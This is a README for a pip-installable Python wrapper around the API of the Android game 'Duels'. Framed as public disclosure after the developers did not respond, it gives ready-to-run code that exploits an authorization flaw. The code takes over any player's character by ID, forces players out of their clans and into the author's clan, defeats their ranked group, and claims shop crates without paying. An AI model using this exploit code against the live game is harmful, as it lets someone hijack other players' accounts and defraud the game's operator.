A simple wrapper for [Duels](https://play.google.com/store/apps/details?id=com.deemedyainc.duels&hl=en_US) API game on Android 

This game have many issue 

Installing

```pip install DuelsGameApi```

Example code from game.py
```
from duels_api import User
import cfg

me = User(cfg.my_id)
print(me)

members = me.get_self_clan_members()
for player in members:
    print(player)
```

The main vulnerability of this game is that you can control the character of any player knowing only his id

With this code u can add ANY player to you clan and defeat all players from him ranked group
```
me = User(cfg.my_id)
print(me)

members = me.search_clans()
for player in members:
    player.leave_clan()
    player.join_clan(me.clan_id)
    
    player.defeat_group()
```

Also you can take any crate from shop absolutely free

```
me = User(cfg.my_id)
print(me)
me.get_special_crate()
```


I already wrote to the developers of this game but they didn’t respond, so I decided to share this code. Maybe after that they will pay attention to these problems.
